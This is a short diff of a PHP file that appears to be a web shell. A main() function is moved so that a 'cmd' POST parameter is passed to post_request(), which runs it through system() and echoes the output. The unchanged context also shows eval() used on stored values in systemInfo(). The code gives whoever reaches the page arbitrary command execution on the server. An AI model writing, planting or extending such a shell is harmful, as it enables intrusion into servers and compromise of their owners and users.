@@ -12,13 +12,6 @@ function post_request() {
     $teste = system($command);
     return "<div id='response'>".$teste."</div>";
 }
-function main() {
-    if(isset($_POST['cmd'])) {
-        $resp = post_request();
-        echo $resp;
-       return;
-    }
-}
 
 function systemInfo(){
     $sysinfo = array(
@@ -29,6 +22,14 @@ function systemInfo(){
     
     foreach ($sysinfo as $key => $value) {
         echo "<span>$key</span> "; eval($value) . "\n";
+    }
+}
+
+function main() {
+    if(isset($_POST['cmd'])) {
+        $resp = post_request();
+        echo $resp;
+       return;
     }
 }
 
